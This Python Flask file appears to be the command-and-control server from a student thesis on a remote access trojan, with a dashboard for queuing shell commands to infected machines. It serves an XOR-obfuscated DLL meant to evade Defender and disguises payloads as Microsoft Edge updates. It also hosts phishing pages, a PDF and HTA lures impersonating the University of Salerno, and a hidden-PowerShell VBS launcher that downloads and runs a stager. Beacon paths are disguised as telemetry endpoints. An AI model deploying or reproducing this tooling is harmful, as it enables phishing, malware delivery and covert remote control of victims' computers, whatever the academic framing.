#!/usr/bin/env python3
"""
C2 Server v2 — Flask HTTPS con dashboard web e cifratura XOR payload.
Multi-agent, URI pool randomizzato, payload XOR auto-cifrato su /update_dll.
Giuseppe Alfonso Mangiola, TESI RAT 2026, DIEM UNISA
"""

from flask import Flask, request, jsonify, send_file, render_template_string
import os, json, re, threading, time, secrets
from datetime import datetime
from pathlib import Path

app = Flask(__name__)

# ── Chiave XOR per cifratura payload ─────────────────────────────────
XOR_KEY = bytes.fromhex('d683f9ce3e3d091215b422cfef509f00279815c0ee7451687c615599e743ee28')

# ── Stato globale agenti ──────────────────────────────────────────────
agents = {}
agents_lock = threading.Lock()

# ── Funzione XOR ──────────────────────────────────────────────────────
def xor_cipher(data: bytes, key: bytes) -> bytes:
    return bytes(b ^ key[i % len(key)] for i, b in enumerate(data))

# ── Identifica agente da IP ───────────────────────────────────────────
def get_or_create_agent(ip: str) -> str:
    with agents_lock:
        for aid, agent in agents.items():
            if agent['ip'] == ip:
                agent['last_seen'] = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
                return aid
        aid = secrets.token_hex(4).upper()
        agents[aid] = {
            'ip':         ip,
            'first_seen': datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
            'last_seen':  datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
            'commands':   [],
            'results':    [],
            'hostname':   'unknown',
            'username':   'unknown',
            'cwd':        '',
        }
        print(f"\n[+] Nuovo agente registrato: {aid} da {ip}")
        return aid

# ── Fix JSON con backslash non escapati (output Windows) ─────────────
def parse_result_body(raw: bytes) -> dict | None:
    try:
        return json.loads(raw.decode('utf-8'))
    except Exception:
        pass
    for enc in ('cp1252', 'latin-1', 'utf-8'):
        try:
            text = raw.decode(enc, errors='replace')
            fixed = re.sub(r'\\(?!["\\/bfnrtu])', r'\\\\', text)
            return json.loads(fixed)
        except Exception:
            continue
    return None


# ══════════════════════════════════════════════════════════════════════
# URI POOL — stesso identico set del client https_beacon.c
# Il client sceglie uno a caso a ogni ciclo; il server accetta tutti.
# ══════════════════════════════════════════════════════════════════════
BEACON_URIS = [
    '/update/check',
    '/telemetry/v2/report',
    '/diagnostics/heartbeat',
    '/sync/status',
    '/cdn/edge/ping',
    '/update/v3/manifest',
    '/health/check',
    '/metrics/collect',
    # vecchio path mantenuto per compatibilità
    '/beacon',
]

RESULT_URIS = [
    '/update/apply',
    '/telemetry/v2/submit',
    '/diagnostics/upload',
    '/sync/push',
    '/cdn/edge/data',
    '/update/v3/result',
    '/metrics/push',
    '/report/submit',
    # vecchio path mantenuto per compatibilità
    '/result',
]


# ══════════════════════════════════════════════════════════════════════
# HANDLER BEACON — logica condivisa, registrata su tutti gli URI pool
# ══════════════════════════════════════════════════════════════════════

def _handle_beacon():
    ip  = request.remote_addr
    aid = get_or_create_agent(ip)
    ts  = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
    print(f"\n[+] Beacon [{aid}] {ip} @ {ts}  path={request.path}")

    with agents_lock:
        agent = agents[aid]
        if agent['commands']:
            cmd = agent['commands'].pop(0)
            print(f"[>] [{aid}] Invio: {cmd}")
            return jsonify({"cmd": cmd, "aid": aid}), 200
    return jsonify({"cmd": "", "aid": aid}), 200


def _handle_result():
    raw  = request.get_data()
    data = parse_result_body(raw) if raw else None

    ip  = request.remote_addr
    aid = get_or_create_agent(ip)
    ts  = datetime.now().strftime('%Y-%m-%d %H:%M:%S')

    if not data:
        print(f"[!] [{aid}] result body non parsabile @ {ts}: {raw[:200]!r}")
        return jsonify({"status": "ok"}), 200

    output = data.get('output', '')
    cmd    = data.get('cmd', '')
    cwd    = data.get('cwd', '')

    print(f"\n[<] [{aid}] Risultato @ {ts}  path={request.path}:")
    print(f"    CMD: {cmd}")
    print(f"    CWD: {cwd}")
    print(f"    OUT: {output[:500]}")

    with agents_lock:
        agents[aid]['results'].append({
            'time':   ts,
            'cmd':    cmd,
            'output': output,
            'cwd':    cwd,
        })
        if cwd:
            agents[aid]['cwd'] = cwd
        if 'whoami' in cmd.lower() and '\\' in output:
            parts = output.strip().split('\\')
            if len(parts) == 2:
                agents[aid]['hostname'] = parts[0].strip()
                agents[aid]['username'] = parts[1].strip()

    return jsonify({"status": "ok"}), 200


# ── Registra ogni URI del pool beacon (GET) ───────────────────────────
for _uri in BEACON_URIS:
    # Flask richiede endpoint name unico — usiamo l'URI sanitizzato
    _ep = 'beacon_' + _uri.replace('/', '_').replace('.', '_').strip('_')
    app.add_url_rule(_uri, _ep, _handle_beacon, methods=['GET'])

# ── Registra ogni URI del pool result (POST) ─────────────────────────
for _uri in RESULT_URIS:
    _ep = 'result_' + _uri.replace('/', '_').replace('.', '_').strip('_')
    app.add_url_rule(_uri, _ep, _handle_result, methods=['POST'])


# ══════════════════════════════════════════════════════════════════════
# ENDPOINT STATICI ESISTENTI (invariati)
# ══════════════════════════════════════════════════════════════════════

@app.route('/update_dll', methods=['GET'])
def update_dll():
    """Serve rat.dll cifrata con XOR — Defender non la firma"""
    dll_path = Path(__file__).parent.parent / 'client' / 'rat.dll'
    if not dll_path.exists():
        return "DLL not found", 404
    raw   = dll_path.read_bytes()
    enc   = xor_cipher(raw, XOR_KEY)
    enc_path = Path(__file__).parent / 'rat_enc.bin'
    enc_path.write_bytes(enc)
    return send_file(str(enc_path), as_attachment=True,
                     download_name='msedge_update.bin')

@app.route('/update_dll_raw', methods=['GET'])
def update_dll_raw():
    """Serve rat.dll non cifrata — per test con loader EXE"""
    dll_path = Path(__file__).parent.parent / 'client' / 'rat.dll'
    return send_file(str(dll_path), as_attachment=True,
                     download_name='msedge_update.dll')

@app.route('/loader', methods=['GET'])
def loader():
    loader_path = Path(__file__).parent.parent / 'client' / 'test_loader.exe'
    if not loader_path.exists():
        return "Loader not found", 404
    return send_file(str(loader_path), as_attachment=True,
                     download_name='MicrosoftEdgeUpdate.exe')

@app.route('/portale', methods=['GET'])
@app.route('/Home.do', methods=['GET'])
def phishing_page():
    portal_path = Path(__file__).parent / 'phishing' / 'portal.html'
    return send_file(str(portal_path))

@app.route('/payload.hta', methods=['GET'])
def payload_hta():
    hta_path = Path(__file__).parent / 'phishing' / 'payload.hta'
    with open(str(hta_path), 'r') as f:
        content = f.read()
    from flask import Response
    return Response(content, mimetype='application/hta')

@app.route('/stager')
def serve_stager():
    """Serve stager.ps1 iniettando l'IP C2 a runtime."""
    stager_path = Path(__file__).parent.parent / 'client' / 'stager.ps1'
    if not stager_path.exists():
        return f"stager.ps1 not found at {stager_path}", 404
    content = stager_path.read_text()
    host = request.host.split(':')[0]
    content = re.sub(r'\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}', host, content)
    from flask import Response
    return Response(content, mimetype='text/plain')

@app.route('/launcher')
def serve_launcher():
    """
    Serve UnisaCertUpdate.vbs — vettore via PDF link.
    .vbs → wscript.exe → nessuna finestra console visibile (a differenza di .bat).
    Lancia PowerShell completamente nascosto (windowStyle=0).
    """
    c2 = "https://192.168.42.124:443"
    ps_cmd = (
        "[Net.ServicePointManager]::SecurityProtocol=[Net.SecurityProtocolType]::Tls12;"
        "[System.Net.ServicePointManager]::ServerCertificateValidationCallback={$true};"
        f"IEX(New-Object Net.WebClient).DownloadString('{c2}/stager')"
    )
    # VBScript quoting:
    #   ""  dentro una stringa = " escaped
    #   La stringa -Command va racchiusa tra "": apre con "" e chiude con """
    #   (due " per il quote escaped + uno per chiudere la stringa VBS)
    # windowStyle=0 → finestra completamente nascosta; bAsync=False → wscript non aspetta
    vbs = (
        'Set o=CreateObject("WScript.Shell")\r\n'
        f'o.Run "powershell -WindowStyle Hidden -ExecutionPolicy Bypass -Command ""{ps_cmd}""", 0, False\r\n'
    )
    from flask import Response
    return Response(
        vbs,
        mimetype='application/octet-stream',
        headers={'Content-Disposition': 'attachment; filename="UnisaCertUpdate.vbs"'}
    )
    
@app.route('/transcript', methods=['GET'])
@app.route('/academic', methods=['GET'])
def phishing_xlsm():
    html_path = Path(__file__).parent / 'phishing' / 'index.html'
    if not html_path.exists():
        return "Not found", 404
    return send_file(str(html_path), mimetype='text/html')

@app.route('/download', methods=['GET'])
def phishing_zip():
    zip_path = Path(__file__).parent / 'phishing' / 'Academic_Transcript.zip'
    if not zip_path.exists():
        return "Not found", 404
    return send_file(str(zip_path), as_attachment=True,
                     download_name='Academic_Transcript.zip',
                     mimetype='application/zip')

@app.route('/comunicazione', methods=['GET'])
@app.route('/document', methods=['GET'])
def phishing_pdf():
    """Serve il PDF con JS OpenAction → stager (vettore alternativo all'xlsm)"""
    pdf_path = Path(__file__).parent / 'phishing' / 'UnisaDocument.pdf'
    if not pdf_path.exists():
        return "Not found — esegui prima: python3 phishing/create_pdf_stager.py", 404
    return send_file(str(pdf_path), as_attachment=True,
                     download_name='Comunicazione_Segreteria_UNISA.pdf',
                     mimetype='application/pdf')
                     
@app.route('/logo_unisa.png', methods=['GET'])
def serve_stego():
    stego_path = Path(__file__).parent / 'unisa_logo_stego.png'
    if not stego_path.exists():
        return "Not found — esegui prima: python3 server/genera_stego.py", 404
    return send_file(str(stego_path), mimetype='image/png')
# ══════════════════════════════════════════════════════════════════════
# API PER LA DASHBOARD (invariate)
# ══════════════════════════════════════════════════════════════════════

@app.route('/api/agents', methods=['GET'])
def api_agents():
    with agents_lock:
        result = {}
        for aid, agent in agents.items():
            result[aid] = {
                'ip':         agent['ip'],
                'first_seen': agent['first_seen'],
                'last_seen':  agent['last_seen'],
                'hostname':   agent['hostname'],
                'username':   agent['username'],
                'cwd':        agent.get('cwd', ''),
                'commands':   list(agent['commands']),
            }
        return jsonify(result)

@app.route('/api/send', methods=['POST'])
def api_send():
    data  = request.get_json()
    aid   = data.get('aid')
    cmd   = data.get('cmd', '').strip()
    if not aid or not cmd:
        return jsonify({"status": "error"}), 400
    with agents_lock:
        if aid not in agents:
            return jsonify({"status": "agent not found"}), 404
        agents[aid]['commands'].append(cmd)
    print(f"[*] [{aid}] Comando in coda: {cmd}")
    return jsonify({"status": "ok"})

@app.route('/api/results/<aid>', methods=['GET'])
def api_results(aid):
    with agents_lock:
        if aid not in agents:
            return jsonify([])
        return jsonify(agents[aid]['results'])


# ══════════════════════════════════════════════════════════════════════
# DASHBOARD WEB (invariata)
# ══════════════════════════════════════════════════════════════════════

DASHBOARD = """
<!DOCTYPE html>
<html lang="it">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>RAT C2 — Dashboard</title>
<style>
  * { box-sizing: border-box; margin: 0; padding: 0; }
  body { background: #0d1117; color: #c9d1d9; font-family: 'Courier New', monospace; }
  header { background: #161b22; border-bottom: 1px solid #30363d; padding: 16px 24px;
           display: flex; align-items: center; gap: 12px; }
  header h1 { font-size: 18px; color: #58a6ff; }
  .badge { background: #1f6feb; color: #fff; border-radius: 4px;
           padding: 2px 8px; font-size: 12px; }
  .container { display: grid; grid-template-columns: 300px 1fr; height: calc(100vh - 57px); }
  .sidebar { background: #161b22; border-right: 1px solid #30363d;
             overflow-y: auto; padding: 12px; }
  .sidebar h2 { font-size: 13px; color: #8b949e; text-transform: uppercase;
                letter-spacing: 1px; margin-bottom: 12px; }
  .agent-card { background: #21262d; border: 1px solid #30363d; border-radius: 6px;
                padding: 12px; margin-bottom: 8px; cursor: pointer; transition: border-color .2s; }
  .agent-card:hover, .agent-card.active { border-color: #58a6ff; }
  .agent-id { color: #58a6ff; font-weight: bold; font-size: 14px; }
  .agent-info { color: #8b949e; font-size: 12px; margin-top: 4px; }
  .online-dot { display: inline-block; width: 8px; height: 8px;
                background: #3fb950; border-radius: 50%; margin-right: 6px; }
  .main { display: flex; flex-direction: column; }
  .terminal { flex: 1; background: #0d1117; padding: 16px;
              overflow-y: auto; font-size: 13px; line-height: 1.6; }
  .cmd-line { color: #58a6ff; }
  .result-line { color: #c9d1d9; white-space: pre-wrap; margin-bottom: 8px; }
  .ts { color: #8b949e; font-size: 11px; }
  .input-bar { background: #161b22; border-top: 1px solid #30363d;
               padding: 12px 16px; display: flex; gap: 8px; }
  .input-bar select { background: #21262d; color: #c9d1d9; border: 1px solid #30363d;
                      border-radius: 6px; padding: 8px; font-family: inherit; font-size: 13px; }
  .input-bar input { flex: 1; background: #21262d; color: #c9d1d9;
                     border: 1px solid #30363d; border-radius: 6px;
                     padding: 8px 12px; font-family: inherit; font-size: 13px; outline: none; }
  .input-bar input:focus { border-color: #58a6ff; }
  .input-bar button { background: #1f6feb; color: #fff; border: none;
                      border-radius: 6px; padding: 8px 16px; cursor: pointer;
                      font-family: inherit; font-size: 13px; }
  .input-bar button:hover { background: #388bfd; }
  .no-agent { display: flex; align-items: center; justify-content: center;
              height: 100%; color: #8b949e; font-size: 14px; }
  .stats { background: #161b22; border-bottom: 1px solid #30363d;
           padding: 8px 16px; display: flex; gap: 24px; font-size: 12px; color: #8b949e; }
  .stats span { color: #c9d1d9; }
</style>
</head>
<body>
<header>
  <h1>&#9760; RAT C2 Dashboard</h1>
  <span class="badge" id="agent-count">0 agenti</span>
  <span class="badge" style="background:#238636" id="server-status">ONLINE</span>
</header>
<div class="container">
  <div class="sidebar">
    <h2>Agenti</h2>
    <div id="agents-list"></div>
  </div>
  <div class="main">
    <div class="stats">
      Agente: <span id="stat-id">—</span> &nbsp;|&nbsp;
      Host: <span id="stat-host">—</span> &nbsp;|&nbsp;
      User: <span id="stat-user">—</span> &nbsp;|&nbsp;
      Dir: <span id="stat-cwd" style="color:#f0883e">—</span> &nbsp;|&nbsp;
      Ultimo beacon: <span id="stat-last">—</span>
    </div>
    <div id="queue-bar" style="display:none;background:#161b22;border-bottom:1px solid #30363d;padding:8px 16px;font-size:12px;color:#8b949e;">
    </div>
    <div class="terminal" id="terminal">
      <div class="no-agent" id="no-agent">Seleziona un agente dalla lista</div>
    </div>
    <div class="input-bar">
      <select id="shell-type">
        <option value="cmd">cmd</option>
        <option value="ps">PowerShell</option>
      </select>
      <input type="text" id="cmd-input" placeholder="Digita un comando..."
             onkeydown="if(event.key==='Enter') sendCmd()">
      <button onclick="sendCmd()">Invia</button>
    </div>
  </div>
</div>
<script>
let currentAid = null;
let lastResultCount = {};

function formatOutput(results) {
  if (!results.length) return '<div style="color:#8b949e;padding:16px">Nessun risultato ancora.</div>';
  let html = '';
  results.forEach(r => {
    html += `<div class="ts">[${r.time}]</div>`;
    html += `<div class="cmd-line">&#62; ${escHtml(r.cmd || '')}</div>`;
    html += `<div class="result-line">${escHtml(r.output || '')}</div>`;
  });
  return html;
}

function escHtml(s) {
  return String(s)
    .replace(/&/g,'&amp;').replace(/</g,'&lt;')
    .replace(/>/g,'&gt;').replace(/"/g,'&quot;');
}

async function loadAgents() {
  const res = await fetch('/api/agents');
  const agents = await res.json();
  const list = document.getElementById('agents-list');
  const count = Object.keys(agents).length;
  document.getElementById('agent-count').textContent = count + ' agent' + (count===1?'e':'i');
  list.innerHTML = '';

  for (const [aid, agent] of Object.entries(agents)) {
    const queueLen = agent.commands ? agent.commands.length : 0;
    const card = document.createElement('div');
    card.className = 'agent-card' + (aid === currentAid ? ' active' : '');
    card.innerHTML = `
      <div class="agent-id">
        <span class="online-dot"></span>${aid}
        ${queueLen > 0 ? `<span style="background:#f85149;color:#fff;border-radius:10px;padding:1px 7px;font-size:11px;margin-left:6px">${queueLen} in coda</span>` : ''}
      </div>
      <div class="agent-info">${agent.ip}</div>
      <div class="agent-info">${agent.hostname || 'unknown'}\\${agent.username || 'unknown'}</div>
      <div class="agent-info">${agent.last_seen}</div>`;
    card.onclick = () => selectAgent(aid, agent);
    list.appendChild(card);
  }

  if (currentAid && agents[currentAid]) {
    const agent = agents[currentAid];
    document.getElementById('stat-id').textContent   = currentAid;
    document.getElementById('stat-host').textContent = agent.hostname || 'unknown';
    document.getElementById('stat-user').textContent = agent.username || 'unknown';
    document.getElementById('stat-cwd').textContent  = agent.cwd || '—';
    document.getElementById('stat-last').textContent = agent.last_seen;
    updateQueue(agent.commands || []);
    loadResults();
  }
}

function updateQueue(commands) {
  const queueDiv = document.getElementById('queue-bar');
  if (!commands.length) { queueDiv.style.display = 'none'; return; }
  queueDiv.style.display = 'block';
  queueDiv.innerHTML = '<strong style="color:#f85149">In coda:</strong> ' +
    commands.map(c => `<code style="background:#21262d;padding:2px 6px;border-radius:3px;margin:0 3px">${escHtml(c)}</code>`).join(' ');
}

async function selectAgent(aid, agent) {
  currentAid = aid;
  document.getElementById('no-agent').style.display = 'none';
  document.getElementById('stat-id').textContent   = aid;
  document.getElementById('stat-host').textContent = agent.hostname || 'unknown';
  document.getElementById('stat-user').textContent = agent.username || 'unknown';
  document.getElementById('stat-cwd').textContent  = agent.cwd || '—';
  document.getElementById('stat-last').textContent = agent.last_seen;
  updateQueue(agent.commands || []);
  loadResults();
  loadAgents();
}

async function loadResults() {
  if (!currentAid) return;
  const res     = await fetch('/api/results/' + currentAid);
  const results = await res.json();
  const term    = document.getElementById('terminal');
  if (results.length !== (lastResultCount[currentAid] || 0)) {
    lastResultCount[currentAid] = results.length;
    term.innerHTML = formatOutput(results);
    term.scrollTop = term.scrollHeight;
  }
}

async function sendCmd() {
  if (!currentAid) { alert('Seleziona un agente'); return; }
  const input = document.getElementById('cmd-input');
  const shell = document.getElementById('shell-type').value;
  let cmd = input.value.trim();
  if (!cmd) return;
  if (shell === 'ps') cmd = 'ps:' + cmd;
  await fetch('/api/send', {
    method: 'POST',
    headers: {'Content-Type':'application/json'},
    body: JSON.stringify({ aid: currentAid, cmd: cmd })
  });
  input.value = '';
  setTimeout(loadAgents, 500);
}

setInterval(loadAgents, 3000);
setInterval(function() { if (currentAid) loadResults(); }, 3000);
loadAgents();
</script>
</body>
</html>
"""

@app.route('/', methods=['GET'])
def dashboard():
    return render_template_string(DASHBOARD)


# ══════════════════════════════════════════════════════════════════════
# MAIN
# ══════════════════════════════════════════════════════════════════════

if __name__ == '__main__':
    certs_dir = Path(__file__).parent / 'certs_unisa'
    cert_file = certs_dir / 'server.crt'
    key_file  = certs_dir / 'server.key'

    if not cert_file.exists():
        print("[-] Certificato non trovato.")
        exit(1)

    print(f"\n{'='*60}")
    print(f"  RAT C2 Server v2")
    print(f"  Dashboard: https://192.168.42.124/")
    print(f"  Beacon URI pool: {len(BEACON_URIS)} endpoints")
    print(f"  Result URI pool: {len(RESULT_URIS)} endpoints")
    print(f"  XOR Key: {XOR_KEY.hex()[:16]}...")
    print(f"{'='*60}\n")

    app.run(
        host='0.0.0.0',
        port=443,
        ssl_context=(str(cert_file), str(key_file)),
        debug=False,
        threaded=True
    )
